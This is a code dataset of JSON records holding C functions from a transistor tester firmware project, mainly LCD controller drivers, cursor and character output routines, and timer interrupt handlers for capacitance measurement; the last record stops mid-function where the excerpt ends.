{"docstring": "/* lcd_refresh writes the pixel image data to the ST7920 controller GDRAM */\n/* usually the refresh is done after the display data are finished before waiting */\n", "func_signal": "void lcd_refresh(void)", "code": "{\n  unsigned char xx;\n  unsigned char yy, yyo;\n  for (yy=0; yy<SCREEN_HEIGHT; yy++) {\n    yyo = (yy + LCD_ST7565_Y_START) & 0x3f;\t/* the y-address with offset */\n    if (yyo < 32) {\n      lcd_command(CMD_SET_GDRAM_ADDRESS|yyo);\t/* set vertical start address */\n      lcd_command(CMD_SET_GDRAM_ADDRESS|0);\t/* horizontal address starts with 0 */\n    } else {\n      // the second half of display is located at GDRAM address 128..255 ((8..15) x 16 pixel)\n      lcd_command(CMD_SET_GDRAM_ADDRESS|(yyo-32));\t/* set vertical start address */\n      lcd_command(CMD_SET_GDRAM_ADDRESS|(SCREEN_WIDTH / 16));\t/* horizontal address starts with 0 (128)*/\n    }\n    for (xx=0; xx<(SCREEN_WIDTH / 8); xx++) {\n      lcd_write_data(lcd_bit_mem[yy][xx]);\t// write 16 x 8 bits to GDRAM (= 128 pixel)\n    }\n  } /* end for yy */\n  wdt_reset();\n}", "path": "Software\\trunk\\lcd-routines.c", "repo_name": "Mikrocontroller-net/transistortester", "stars": 306, "license": "None", "language": "c", "size": 195437}
{"docstring": "/* Interrupt Service Routine for timer1 Overflow */\n", "func_signal": "ISR(TIMER1_OVF_vect, ISR_BLOCK)", "code": "{\n if ((!(TI1_INT_FLAGS & (1<<ICF1)) && (unfinished !=0)) || ((TI1_INT_FLAGS & (1<<ICF1)) && (ICR1 < 250))) {\n    // Capture Event not pending or (Capture Event pending and ICR1 < 250\n    // the ICR1H is buffered and can not examined alone, we must read the ICR1L first (with ICR1 access) !\n   ovcnt16++;\t\t\t\t// count Overflow\n }\n}", "path": "Software\\trunk\\ReadCapacity.c", "repo_name": "Mikrocontroller-net/transistortester", "stars": 306, "license": "None", "language": "c", "size": 195437}
{"docstring": "/* ******************************************************************************* */\n/* ******************************************************************************* */\n// sends a character to the LCD \n", "func_signal": "void lcd_data(unsigned char temp1)", "code": "{\n/* -------------------------------------------------------------------------- */\n\n#ifdef LCD_ICON_COLOR\n #ifdef LCD_CHANGE_COLOR\n lcd_fg_color.w = lcd_fg2_color.w;\n #else\n lcd_fg_color.w = LCD_FG_COLOR;\n #endif\n#endif\n_lcd_column++;\n#if (LCD_GRAPHIC_TYPE != 0)\n uint8_t *pfont;\n #if FONT_WIDTH != 5\n if (temp1 < 12) {\n  pfont = (uint8_t *)sfont + (SFONT_WIDTH * PAGES_PER_LINE * temp1);\t// first byte of character data\n  // for other controllers like ST7565 the _page specifies the page of the controller (8 lines)\n  lcd_set_pixels( pfont, _xpos, _page*8, 0, (unsigned char)SFONT_WIDTH, (unsigned char)(PAGES_PER_LINE*8));\n _xpos += FONT_H_SPACE;\t\t// move pointer to the next character position\n } else {  /* normal character need extra horizontal space */\n  pfont = (uint8_t *)nfont + ((FONT_WIDTH-1) * PAGES_PER_LINE * (temp1-12-16));\t// first byte of character data\n  lcd_set_pixels( pfont, _xpos, _page*8, 0, (unsigned char)(FONT_WIDTH-1), (unsigned char)(PAGES_PER_LINE*8));\n _xpos += (FONT_WIDTH-1);\t\t// move pointer to the next character position\n  lcd_set_pixels( &nfont[((unsigned char)(' '-12-16))][0], _xpos, _page*8, 0, (unsigned char)(FONT_H_SPACE-(FONT_WIDTH-1)), (unsigned char)(PAGES_PER_LINE*8));\n  _xpos += (FONT_H_SPACE-(FONT_WIDTH-1));\n }\n #else    /* FONT_WIDTH == 5 */ \n unsigned char cc = temp1;\n if (temp1 > 9) cc -= Gap_length;\n pfont = (uint8_t *)font + (FONT_WIDTH * PAGES_PER_LINE * cc);\t// first byte of character data\n // for other controllers like ST7565 the _page specifies the page of the controller (8 lines)\n lcd_set_pixels( pfont, _xpos, _page*8, 0, (unsigned char)FONT_WIDTH, (unsigned char)(PAGES_PER_LINE*8));\n_xpos += FONT_H_SPACE;\t\t// move pointer to the next character position\n #endif\n#else\n lcd_write_data(temp1);\t\t// set RS to 1\n#endif\n\n#ifdef WITH_UART\n switch(temp1) {\n    case LCD_CHAR_DIODE1:\n    \tuart_putc('>');\n    \tuart_putc('|');\n    \tbreak;\n    case LCD_CHAR_DIODE2:\n    \tuart_putc('|');\n    \tuart_putc('<');\n    \tbreak;\n    case LCD_CHAR_CAP:\n    \tuart_putc('|');\n    \tuart_putc('|');\n    \tbreak;\n    case LCD_CHAR_RESIS1:\n    case LCD_CHAR_RESIS2:\n    \tuart_putc('R');\n    \tbreak;\n    case LCD_CHAR_LINE1:\n        uart_putc('-');\n        break;\n//    case LCD_CHAR_DEGREE:\t// degree sign\n//    \tuart_putc(0xf8);\t// codepage 437 or 850 has degree\n//    \tbreak;\n    case LCD_CHAR_U:\t\t//\n//    \tuart_putc(0xe6);\t// codepage 437 or 850 has my\n    \tuart_putc('u');\t\t// better use the ASCII u\n    \tbreak;\n    case LCD_CHAR_OMEGA:\t//Omega\n        uart_putc('O');\n        uart_putc('h');\n        uart_putc('m');\n    \tbreak;\n #if LCD_CHAR_INDUCTOR1 != 'w'\n    case LCD_CHAR_INDUCTOR1:\n    case LCD_CHAR_INDUCTOR2:\n        uart_putc('L');\n        break;\n #endif\n    default:\n    \tuart_putc(temp1);\n }\n#endif\n wdt_reset();\n}", "path": "Software\\trunk\\lcd-routines.c", "repo_name": "Mikrocontroller-net/transistortester", "stars": 306, "license": "None", "language": "c", "size": 195437}
{"docstring": "/* ******************************************************************************* */\n// send space characters to LCD\n", "func_signal": "void lcd_spaces(int8_t nn)", "code": "{\n   while (nn > 0) {\n     lcd_space();\t// output one space to LCD and UART\n     nn--;\n   }\n}", "path": "Software\\trunk\\lcd-routines.c", "repo_name": "Mikrocontroller-net/transistortester", "stars": 306, "license": "None", "language": "c", "size": 195437}
{"docstring": "/* ************************************************************************************** */\n/* Set the character position to x,y , where x specifies the character number in a text line. */\n/* The y position is the page address (8 line units).                                     */\n/* For most controllers the y position must be increased by (Height + 7) / 8 for the next text line */\n", "func_signal": "void lcd_set_cursor(uint8_t y, uint8_t x)", "code": "{\n    _lcd_column = x;\n#if (LCD_GRAPHIC_TYPE != 0)\n   //move to the specified position (depends on used font)\n   _page = y;\n   lcd_text_line = y / PAGES_PER_LINE;\n    // The pixel memory is greater as the display window.\n    // For example the SPL501 controller has 132x65 dot matrix memory\n    // LCD_ST7565_H_OFFSET specifies the offset of the 128 pixel of the display window.\n   _xpos = (x * FONT_H_SPACE);\n#else\n   // move to the specified position for character display\n   if (y == 1) {\n     lcd_command((uint8_t)(CMD_SetDDRAMAddress + LCD_Row2 + x));\n #if (LCD_LINES > 2)\n   } else if (y == 2) {\n     lcd_command((uint8_t)(CMD_SetDDRAMAddress + LCD_Row3 + x));\n   } else if (y == 3) {\n     lcd_command((uint8_t)(CMD_SetDDRAMAddress + LCD_Row4 + x));\n #endif\n   } else {\n     lcd_command((uint8_t)(CMD_SetDDRAMAddress + LCD_Row1 + x));\n   }\n#endif\n}", "path": "Software\\trunk\\lcd-routines.c", "repo_name": "Mikrocontroller-net/transistortester", "stars": 306, "license": "None", "language": "c", "size": 195437}
{"docstring": "/* ******************************************************************************* */\n//move to the beginning of the 2. row\n// for the ST7920 you can select a accurate vertical pixel positioning of line with:\n// or you can select a 8-line rounding of the positioning of the lines with: \n//#define FONT_V_SPACE (((FONT_HEIGHT + 7) / 8) * 8)\n", "func_signal": "void lcd_line2()", "code": "{\n   lcd_text_line = 1;\n#if (LCD_GRAPHIC_TYPE != 0)\n   lcd_set_cursor(1 * PAGES_PER_LINE,0);\n#else\n   lcd_command((uint8_t)(CMD_SetDDRAMAddress + LCD_Row2));\n   _lcd_column = 0;\n#endif\n#ifdef WITH_UART\n   uart_newline();\t\t// start of new line\n #if WITH_UART == 2\t\t// MAURO\n   uart_putc('2');\t\t// MAURO\n #endif\t\t\t\t// MAURO\n#endif\n}", "path": "Software\\trunk\\lcd-routines.c", "repo_name": "Mikrocontroller-net/transistortester", "stars": 306, "license": "None", "language": "c", "size": 195437}
{"docstring": "/* ******************************************************************************* */\n//move to the beginning of the 4. row\n", "func_signal": "void lcd_line4()", "code": "{\n   lcd_text_line = 3;\n#if (LCD_GRAPHIC_TYPE != 0)\n   lcd_set_cursor(3 * PAGES_PER_LINE,0);\n#else\n   lcd_command((uint8_t)(CMD_SetDDRAMAddress + LCD_Row4));\n   _lcd_column = 0;\n#endif\n#ifdef WITH_UART\n   uart_newline();\t\t// start of new line\n #if WITH_UART == 2\t\t// MAURO\n   uart_putc('4');\t\t// MAURO\n #endif\t\t\t\t// MAURO\n#endif\n}", "path": "Software\\trunk\\lcd-routines.c", "repo_name": "Mikrocontroller-net/transistortester", "stars": 306, "license": "None", "language": "c", "size": 195437}
{"docstring": "/* Interrupt Service Routine for timer1 capture event (Comparator) */\n", "func_signal": "ISR(TIMER1_CAPT_vect, ISR_BLOCK)", "code": "{\n unfinished = 0;\t\t\t// clear unfinished flag\n // With unfinished set to 0, we prevent further counting the Overflow.s\n // Is already a Overflow detected?\n if((TI1_INT_FLAGS & (1<<TOV1))) {\t// counter overflow, 65.536 ms @ 1MHz, 8.192ms @ 8MHz\n   //there is already a Overflow detected, before or after the capture event?\n   // ICR1H is buffered and can not examined alone, we must read the ICR1L first (with ICR1 access) !\n   if (ICR1 < 250) {\n     //  Yes, Input Capture Counter is low, Overflow has occured before the capture event\n     ovcnt16++;\t\t\t\t// count Overflow\n   }\n }\n}", "path": "Software\\trunk\\ReadCapacity.c", "repo_name": "Mikrocontroller-net/transistortester", "stars": 306, "license": "None", "language": "c", "size": 195437}
{"docstring": "/* ************************************************************************************** */\n", "func_signal": "uint8_t lcd_save_position(void)", "code": "{\n last_text_column = _lcd_column;\n last_text_line = lcd_text_line;\n return(last_text_line);\n}", "path": "Software\\trunk\\lcd-routines.c", "repo_name": "Mikrocontroller-net/transistortester", "stars": 306, "license": "None", "language": "c", "size": 195437}
{"docstring": "/* -------------------------------------------------------------------------- */\n", "func_signal": "void lcd_init(void)", "code": "{\n\n#if (LCD_INTERFACE_MODE == MODE_SPI) || (LCD_INTERFACE_MODE == MODE_3LINE)\n   HW_LCD_RES_PORT &= ~_BV(HW_LCD_RES_PIN); // RESET LCD-Display\n   HW_LCD_EN_PORT  &= ~_BV(HW_LCD_EN_PIN);\n   HW_LCD_B0_PORT  &= ~_BV(HW_LCD_B0_PIN);\n   HW_LCD_CE_PORT  &= ~_BV(HW_LCD_CE_PIN);  // LCD CE to low\n\n   HW_LCD_RES_DDR  |= _BV(HW_LCD_RES_PIN); // LCD RESET is Output\n   HW_LCD_EN_DDR   |= _BV(HW_LCD_EN_PIN);  // LCD SCL is Output\n   HW_LCD_B0_DDR   |= _BV(HW_LCD_B0_PIN);  // LCD SI is Output\n   HW_LCD_CE_DDR   |= _BV(HW_LCD_CE_PIN);  // LCD CE is Output\n   wait10us();\n #ifdef LCD_SPI_OPEN_COL\n  #ifdef PULLUP_DISABLE\n    MCUCR = (0<<PUD);             // enable Pull-Up Resistors mega168 family\n  #endif\n   HW_LCD_CE_DDR   &= ~_BV(HW_LCD_CE_PIN);  // LCD CS is Input\n   HW_LCD_CE_PORT  |= _BV(HW_LCD_CE_PIN);   // enable Pullup  = 1\n #else\n   HW_LCD_CE_PORT  |= _BV(HW_LCD_CE_PIN);   // set CS to 1, unselected\n   HW_LCD_CE_DDR   |= _BV(HW_LCD_CE_PIN);  // LCD CS is Output\n  #ifdef LCD_SPI_HW\n   #warning \"Hardware SPI not yet tested\"\n// SPSR = (1<<SPI2X);\t\t\t// for CLK/2\n   SPCR = (1<<SPE) | (1<<MSTR);\t\t// init SPI with CLK/4\n  #endif\n #endif\n #if (LCD_INTERFACE_MODE == MODE_3LINE)\n   // for 3LINE mode the RS is chip enable, RS is send as first serial bit\n  #ifdef LCD_SPI_OPEN_COL\n   HW_LCD_RS_DDR &= ~_BV(HW_LCD_RS_PIN);\t// switch RS (SCE) to input\n   HW_LCD_RS_PORT |= _BV(HW_LCD_RS_PIN);\t// enable PullUp RS (SCE)  \n  #else\n   HW_LCD_RS_PORT |= _BV(HW_LCD_RS_PIN);\t// switch RS (SCE) to VCC\n  #endif  /* LCD_SPI_OPEN_COL */\n #else\n   HW_LCD_RS_PORT  &= ~_BV(HW_LCD_RS_PIN);\n   HW_LCD_RS_DDR   |= _BV(HW_LCD_RS_PIN);  // LCD RS (SCE) is Output\n #endif\n\n   wait_about100ms(); // Set LCD for 100 ms into RESET\n #ifdef LCD_SPI_OPEN_COL\n  #ifdef PULLUP_DISABLE\n    MCUCR = (0<<PUD);             // enable Pull-Up Resistors mega168 family\n  #endif\n   HW_LCD_RES_DDR &= ~_BV(HW_LCD_RES_PIN);\t// switch RES to input\n   HW_LCD_RES_PORT |= _BV(HW_LCD_RES_PIN);\t// enable PullUp RES \n #else\n   HW_LCD_RES_PORT |= _BV(HW_LCD_RES_PIN);\t// switch RES to VCC\n #endif  /* LCD_SPI_OPEN_COL */\n   wait_about100ms();  // Wait for 100 ms after RESET\n#elif (LCD_INTERFACE_MODE == MODE_I2C)   /* ! MODE_SPI || MODE_3LINE */\n   i2c_init();\t\t// init the I2C interface\n   wait_about100ms();\t// Set LCD for 100 ms into RESET\n#elif (LCD_INTERFACE_MODE == MODE_7920_SERIAL) /* ! MODE_SPI || MODE_3LINE || MODE_I2C */\n   HW_LCD_B0_PORT  &= ~_BV(HW_LCD_B0_PIN); // LCD B0 = 0\n   HW_LCD_B0_DDR   |= _BV(HW_LCD_B0_PIN);  // LCD SI is Output\n   HW_LCD_EN_PORT  &= ~_BV(HW_LCD_EN_PIN); // LCD EN = 0\n   HW_LCD_EN_DDR   |= _BV(HW_LCD_EN_PIN);  // LCD SCL is Output\n//   HW_LCD_RESET_PORT &= ~_BV(HW_LCD_RESET_PIN); // set reset low\n//   HW_LCD_RESET_DDR  |= _BV(HW_LCD_RESET_PIN); // LCD RESET is Output\n//   wait1ms();\n//   HW_LCD_RESET_PORT |= _BV(HW_LCD_RESET_PIN); // set reset high\n   wait100ms();\t\t// wait after power up reset\n#elif (LCD_INTERFACE_MODE == MODE_PARALLEL) /* ! MODE_SPI || MODE_3LINE || MODE_I2C || MODE_7920_SERIAL */\n /* ! MODE_SPI || MODE_3LINE || MODE_I2C || MODE_7920_SERIAL */\n #ifdef LCD_ST_TYPE\n   wait100ms();\t\t// wait after power up reset\n   lcd_command(0x22); // set to 4-bit mode for graphic display\n   lcd_command(0x22 ); // set to 4-bit mode\n #endif\n#endif\n\n#if ((LCD_ST_TYPE == 7565) || (LCD_ST_TYPE == 1306))\n   lcd_command(CMD_DISPLAY_OFF);\t\t// display off\n   lcd_command(CMD_INTERNAL_RESET);\t\t// 0xe2\n   lcd_command(CMD_SET_BIAS_9);\t\t\t// 0xa3\n   lcd_command(CMD_SET_ADC_NORMAL);\t\t// 0xa0\n   lcd_command(CMD_SET_COM_NORMAL);\t\t// 0xc0\n\n #if (LCD_ST_TYPE == 7565)\n   //Booster on, Voltage regulator/follower circuit on\n   lcd_command(CMD_SET_POWER_CONTROL | 7);\t// 0x28 BOOSTER ON | V_REGULATOR ON | V_FOLLOWER ON\n   lcd_command(CMD_SET_RESISTOR_RATIO | (7 & LCD_ST7565_RESISTOR_RATIO));\t// 0x20\n\n   lcd_command(CMD_SET_VOLUME_FIRST);\t\t// 0x81 set  volume command\n   lcd_command(eeprom_read_byte(&EE_Volume_Value) & 0x3f);\t//set volume value of EEprom\n\n\n//   lcd_command(CMD_SET_STATIC_OFF);\t\t// 0xac , set Static indicator off\n//   lcd_command(CMD_SET_STATIC_REG | 0);\t// 0x00 , set Static indicator no flashing\n\n//##   lcd_command(CMD_RMW);\t\t\t// 0xe0 , set Read Modify Write mode\n\n #endif\n #if (LCD_ST_TYPE == 1306)\n\n   lcd_command(CMD_SET_DIVIDE_RATIO);\t\t// set display clock div (0xd5), 0x70 is default\t\n   lcd_command(0x80);\t\t// suggested ratio\n\n//   lcd_command(CMD_SET_MUX_RATIO);\t\t// set multiplex (0xa8)\n//   lcd_command(0x3f);\n\n//   lcd_command(CMD_SET_DISPLAY_OFFSET);\t// set display offset (0xd3)\n//   lcd_command(0x00);\t\t// no offset\n\n   lcd_command(CMD_SET_ChargePump);\t\t// charge pump setting (0x8d)\n   lcd_command(0x14);\n\n//   lcd_command(CMD_SET_MEMORY_ADDR_MODE);\t\t// set memory addressing mode (0x20)\n//   lcd_command(0x00);\t\t// horizontal mode\n\n//   lcd_command(CMD_SET_COM_Pins_CONFIG);\t\t// sequential COM pin configuration (0xda)\n//   lcd_command(0x12);\t\t// disable COM Left/Right remap, alternative COM pin\n\n   lcd_command(CMD_SET_VOLUME_FIRST);\t// set contrast\n   lcd_command(eeprom_read_byte(&EE_Volume_Value));\t//set volume value of EEprom\n\n//   lcd_command(CMD_SET_PreCharge_PERIOD);\t\t// set precharge periodi (0xd9), 0x22 is reset value\n//   lcd_command(0xf1);\n\n//   lcd_command(CMD_SET_Vcomh_DESELECT_LEVEL);\t\t// set Vcomh deselect level (0xdb), 0x20 is reset value\n//   lcd_command(0x40);\n//##   lcd_command(CMD_RMW);\t\t\t// 0xe0 , set Read Modify Write mode\n #endif\n   lcd_command(CMD_SET_DISP_START_LINE | (LCD_ST7565_Y_START & 0x3f));\t// 0x40\n   lcd_command(CMD_SET_ALLPTS_NORMAL);\t\t// 0xa4\n   lcd_command(CMD_SET_DISP_NORMAL);\t\t// 0xa6 not reverse\n\n   lcd_clear();\n\n   lcd_command(CMD_DISPLAY_ON);\t\t\t// 0xaf\n\n   lcd_set_cursor(0,0);\n#elif (LCD_ST_TYPE == 8812)    /*  !(LCD_ST_TYPE == 7565 || 1306) */\n   wait_about100ms();\n   lcd_command(CMD_SET_EXTENDED_INSTRUCTION);\t\t// 0x21 switch power on, extended instruction\n   lcd_command(ECMD_SET_HV_STAGES | (LCD_ST7565_RESISTOR_RATIO / 2)); // 0x08|0x03 set charge pump stages (3)\n   lcd_command(ECMD_SET_BIAS | 4);\t\t\t// 0x14 set bias system to 4\n   lcd_command(ECMD_SET_TEMP_COEF | 1);\t\t\t// 0x05 set temperature coefficient to 1\n   lcd_command(ECMD_SET_CONTRAST | (eeprom_read_byte(&EE_Volume_Value) & 0x7f));\t//set volume value of EEprom (0x4e=78) \n   lcd_command(CMD_SET_NORMAL_INSTRUCTION);\t\t// switch power on, normal instruction\n   lcd_clear();\t\t\t// clear display\n//   lcd_command(CMD_SET_DISPLAY_NORMAL);\t\t\t// set display to normal mode\n   lcd_command(CMD_SET_DISPLAY_INVERS);\t\t// set display to inverse mode\n   wait_about50ms();\n#elif (LCD_ST_TYPE == 8814)\n   uint8_t volume;\n//   lcd_command(CMD_DISPLAY_OFF);\t\t// display off\n//   lcd_command(CMD_INTERNAL_RESET);\t\t// 0xe2\n   volume = eeprom_read_byte(&EE_Volume_Value);\t\t// read Vop\n   lcd_command(CMD_SET_VOP_UPPER | ((volume >> 5) & 0x07));\t// set upper Vop\n   lcd_command(CMD_SET_VOP_LOWER | (volume & 0x1f));\t// set lower Vop\n   lcd_command(CMD_SET_START_LINE | (LCD_ST7565_Y_START & 0x3f));       // Set the Start line 0\n   lcd_command(CMD_SET_ALLPTS_NORMAL);\t\t// 0xa4 set display to normal\n   lcd_command(CMD_SET_POWER_CONTROL | 4);\t// 0x28|4 Charge Pump ON\n   lcd_command(CMD_SET_COM_REVERSE);\t\t// 0xc8\n   lcd_command(CMD_SET_COM_NORMAL);\t\t// 0xc0 set normal Y orientation\n   lcd_command(0xa1);\t\t\t\t// set MX, X orientation, is pad selectet!\n   lcd_command(0xaa);\t\t\t\t// set horizontal mode\n   lcd_command(0xac);\t\t\t\t// set initial row\n   lcd_command(0x08);\t\t\t\t// initial row = 8  (0-7)\n   lcd_clear();\n   lcd_command(CMD_DISPLAY_ON);\t\t\t// 0xaf Display on\n   lcd_set_cursor(0,0);\n/* -------------------------------------------------------------------------- */\n#elif (LCD_ST_TYPE == 7920)  /* !(LCD_ST_TYPE == 7565 | 1306 | 8812 | 8814) */\n\n   // reset the ST7920 controller\n   lcd_command(CMD_CLEAR);\t\t\t// clear display\n   wait10ms();\n   lcd_command(CMD_DISPLAY_CONTROL | DISPLAY_ON); // display on\n   lcd_command(CMD_SET_ENTRY_MODE | MODE_RIGHT_MOVE); // increase address counter after read/write\n   lcd_command(CMD_SET_FUNCTION | MODE_EXTENDED); // set to extended mode\n   lcd_clear();\n   lcd_command(CMD_SET_FUNCTION | MODE_EXTENDED | GRAPHIC_DISPLAY_ON);\n   lcd_refresh();\n   lcd_line1();\n/* -------------------------------------------------------------------------- */\n#elif (LCD_ST_TYPE == 7108)  /* !(LCD_ST_TYPE == 7565 | 1306 | 8812 | 8814 | 7920) */\n   wait_about50ms();\n   _lcd_hw_select(3);\t\t// select both controllers\n   lcd_command(CMD_SET_START_LINE | (LCD_ST7565_Y_START & 0x3f));\t// set the start line 0\n   lcd_clear();\n   lcd_command(CMD_DISPLAY_ON);\n   wait_about50ms();\n/* -------------------------------------------------------------------------- */\n#elif ((LCD_ST_TYPE == 7735) || (LCD_ST_TYPE == 9163))  /* !(LCD_ST_TYPE == 7565 | 1306 | 8812 | 8814 | 7920 | 7108) */\n   // init for the ST7735 color display controller\n   wait_about50ms();\n   lcd_command(CMD_EXIT_SLEEP);\t\t// wake up\n   wait_about20ms();\n   lcd_command(CMD_SET_GAMMA);\t\t// set default Gamma\n    lcd_write_data(0x04);\t\t// Gamma curve 3; 0x01= curve 1, 0x02= curve2, 0x08= curve 4\n   lcd_command(CMD_FRAME_RATE_CONTROL);\t\t// Frame Rate Control\n    lcd_write_data(ST_DIVA);\t\t// DIVA=14, default 14(132*162) 17(128*128)\n    lcd_write_data(ST_VPA);\t\t// VPA=16, default 20(132*162) 17(128*128)\n   lcd_command(CMD_POWER_CONTROL1);\t\t// Power_Control1\n    lcd_write_word(0x0e00);\t\t// 0x08 VRH=14, GVDD=4.1, VC=0, VCI1=2.75\n   lcd_command(CMD_POWER_CONTROL2);\t\t// Power_Control2\n    lcd_write_data(0x05);\t\t// BT=5, AVDD=2x VCL=-1x VGH=6x VGL=-3x\n   lcd_command(CMD_VCOM_CONTROL1);\t\t// VCOM_Control1\n    lcd_write_word(0x3840);\t\t// VMH=56  VCOMH=3.900, VML=64  VCOML=-0.900\n   lcd_command(CMD_SET_COLOR_FORMAT);\t\t// set color format\n    lcd_write_data(0x05);\t\t// 16 bit/pixel\n   lcd_command(CMD_MEMORY_ADDRESS_CONTROL);\t\t// Memory address control\n #ifdef LCD_CHANGE_COLOR\n   lcd_bg_color.b[0] = eeprom_read_byte(&EE_BG_COLOR1);\n   lcd_bg_color.b[1] = eeprom_read_byte(&EE_BG_COLOR2);\n  #ifdef LCD_ICON_COLOR\n   lcd_fg2_color.b[0] = eeprom_read_byte(&EE_FG_COLOR1);\n   lcd_fg2_color.b[1] = eeprom_read_byte(&EE_FG_COLOR2);\n  #else\n   lcd_fg_color.b[0] = eeprom_read_byte(&EE_FG_COLOR1);\n   lcd_fg_color.b[1] = eeprom_read_byte(&EE_FG_COLOR2);\n  #endif\n #endif\n #if LCD_SCREEN_ROTATE != 0\n    lcd_write_data(0x3c);\t \t// MV=exchange xy, ML=Vertical refresh, RGB=BGR color,MH=Refresh right to left\n #else\n    lcd_write_data(0x1c);\t \t// ML=Vertical refresh, RGB=BGR color,MH=Refresh right to left\n #endif\n   lcd_command(CMD_INVERSION_CONTROL);\t\t// Display Inversion Control\n    lcd_write_data(0x00);\t\t// NLA=0, NLB=0, NLC=0\n   // ? Gamma set\n\n   lcd_clear();\n   lcd_command(CMD_DISPLAY_ON);\t\t// Display On\n//   lcd_command(0x2c);\t\t// RAMWR\n   wait_about50ms();\n/* -------------------------------------------------------------------------- */\n#elif (LCD_ST_TYPE == 9341)   /* !(LCD_ST_TYPE == 7565 | 1306 | 8812 | 8814 | 7920 | 7108 | 7735 | 9163) */\n/* -------------------------------------------------------------------------- */\n/* init sequence for ILI9341 is taken from the ComponentTester-trendy code of Markus R. */\n  lcd_command(0xf6);\t\t/* power control A */\n  lcd_write_word(0x392c);\n  lcd_write_word(0x0033);\t/* Vcore 1.6V */\n  lcd_write_data(0x02);\t/* DDVDH 5.6V */\n\n  lcd_command(0xcf);\t\t/* power control B */\n  lcd_write_word(0x0099);\n  lcd_write_data(0x30);\t/* enable discharge */\n\n  lcd_command(0xf7);\t\t/* pump ratio control */\n  lcd_write_data(0x20);     /* 2xVCI */\n\n  lcd_command(CMD_POWER_CONTROL1);\t/* power control 1 */\n  lcd_write_data(0x23);\t/* GVDD 4.60V */\n\n  lcd_command(CMD_POWER_CONTROL2);\t/* power control 2 */\n  lcd_write_data(0x03);\t/* DDVDH=2*VCI, VGH=6xVCI, VGL=-3*VCI */\n\n  lcd_command(CMD_VCOM_CONTROL1);\t/* VCOM control 1 */\n  lcd_write_word(0x5c4c);\t/* VCOMH = 5.000V, could be used to adjust contrast, VCOML = -0.600V */\n\n  lcd_command(0xc7);\t\t/* VCOM control 2 */\n  lcd_write_data(0x94);\t/* VCOM offset voltage -44 */\n\n  lcd_command(0xe8);\t\t/* driver timing control A */\n  lcd_write_word(0x8591);\t/* default + 1 unit, default CR timing */\n  lcd_write_data(0x78);\t/* default - 2 units */\n\n  lcd_command(0xea);\t\t/* driver timing control B */\n  lcd_write_word(0x0000);\n\n  lcd_command(CMD_SET_COLOR_FORMAT);\t/* set pixel format for RGB image data */\n  lcd_write_data(0x05);\t/* 16 Bits per pixel */\n\n  lcd_command(CMD_FRAME_RATE_CONTROL);\t/* frame control for normal display mode */\n  lcd_write_word(0x0018);\t/* f_OSC , 24 clocks */\n\n  lcd_command(0xb6);\t\t/* display function control */\n  lcd_write_word(0x0080);\t/* V63 / V0 - VCOML / VCOMH , white, 1 frame */\n  lcd_write_word(0x2700);\t/* 320 lines , DOTCLK / 2 */\n\n  lcd_command(CMD_SET_GAMMA);\t\t/* gamma set */\n  lcd_write_data(0x01);\t/* gamma curve 1 */\n\n  lcd_command(CMD_MEMORY_ADDRESS_CONTROL);\t/* memory access control */\n  #if LCD_SCREEN_ROTATE != 0\n    lcd_write_data(0x20);\t/* swap x and y, RGB */\n  #else\n    lcd_write_data(0x00);\t/*  RGB */\n  #endif\n\n  /* power on */\n  wait_about200ms();\n  lcd_command(CMD_EXIT_SLEEP);\t\t/* exit sleep mode */\n  wait_about50ms();\n  lcd_command(CMD_DISPLAY_ON);         /* display on */\n  wait_about100ms();\n\n  /* we don't clear the display now, because it's quite slow */\n\n/* -------------------------------------------------------------------------- */\n#elif (LCD_ST_TYPE == 1327)   /* !(LCD_ST_TYPE == 7565 | 1306 | 8812 | 8814 | 7920 | 7108 | 7735 | 9163 | 9341) */\n/* -------------------------------------------------------------------------- */\n/* init sequence for SSD1327 is taken from a arduino example */\n\n//  OLED_RST_1;\n//  wait_about100ms();\n//  OLED_RST_0;\n//  wait_about100ms();\n//  OLED_RST_1;\n//  wait_about100ms();\n  lcd_command(CMD_DISPLAY_OFF);\t//--turn off oled panel\n\n  lcd_command(CMD_CASET);\t// 0x15 set column address\n  lcd_command(0);\t\t// start column 0\n  lcd_command((SCREEN_WIDTH/2)-1);    //end column 127\n\n  lcd_command(CMD_RASET);\t// 0x75 set row address\n  lcd_command(0);\t\t// start row 0\n  lcd_command(SCREEN_HEIGHT-1);    // end row 127\n\n  lcd_command(CMD_SET_CONTRAST_CONTROL);\t// 0x81 set contrast control\n  lcd_command(0x80);\n\n  lcd_command(0xa0);    // set Re-map\n  lcd_command(0x51);   // COM Split Odd Even, COM Re-map, Column Address Re-map\n\n//  lcd_command(0xa1);    //start line\n//  lcd_command(0x00);\t\t// 0 (Reset Value)\n\n//  lcd_command(0xa2);    //display offset\n//  lcd_command(0x00);\t\t// 0 (Reset Value)\n\n//  lcd_command(0xa4);    // normal display (Reset Value)\n//  lcd_command(0xa8);    //set multiplex ratio\n//  lcd_command(0x7f);\t\t// 127 (Reset Value)\n\n//  lcd_command(0xb1);    //set phase length\n//  lcd_command(0xf1);\t\t// (0x74 Reset Value)\n\n  lcd_command(0xb3);    //set dclk\n  lcd_command(0x00);    // (0x00 Reset Value) 80Hz:0xc1 90Hz:0xe1, 100Hz:0x00, 110Hz:0x30, 120Hz:0x50, 130Hz:0x70\n\n//  lcd_command(0xab);    // Function Selection A\n//  lcd_command(0x01);    // Enable internal Vdd regulator  (Reset Value)\n\n//  lcd_command(0xb6);    //set second precharge Period\n//  lcd_command(0x0f);\t\t// (0x04 Reset Value)\n\n  lcd_command(0xbe);    // set Vcomh  (0-7)\n  lcd_command(0x0f);\t\t// (0x05 Reset Value 0.82*VCC)\n\n  lcd_command(0xbc);    // set Precharge voltage (0-8)\n  lcd_command(0x08);\t\t// Vcomh (0x05 Reset Value 0.5*VCC)\n\n  lcd_command(0xd5);    // Function Selection B\n  lcd_command(0x62);\t\t// Enable second precharge (0x60 Reset Value)\n\n//  lcd_command(0xfd);\t  // Set Command Lock\n//  lcd_command(0x12);\t\t// Unlock OLED driver IC (0x12 Reset Value)\n// ---\n //Set the display scan and color transfer modes\n  lcd_command(0xa0);\t  // set Remap\n\t\t\t  // 0x40 Enable COM Split Odd Even\n\t\t\t  // 0x10 Enable COM Remap, Enable\n\t\t\t  // 0x04 Enable Horizontal Address Increment\n\t\t\t  // 0x02 Enable Nibble Remap\n\t\t\t  // 0x01 Enable Column Address Remap\n  lcd_command(0x40);\t\n\n  lcd_clear();\t\t// clear the display content\n  //Turn on the OLED display\n  lcd_command(CMD_DISPLAY_ON);\t  // 0xaf set Display ON\n//  lcd_command(0xa4);\t// all pixels normal\n\n\n\n#else    /* !(LCD_ST_TYPE == 7565 | 1306) | 7108 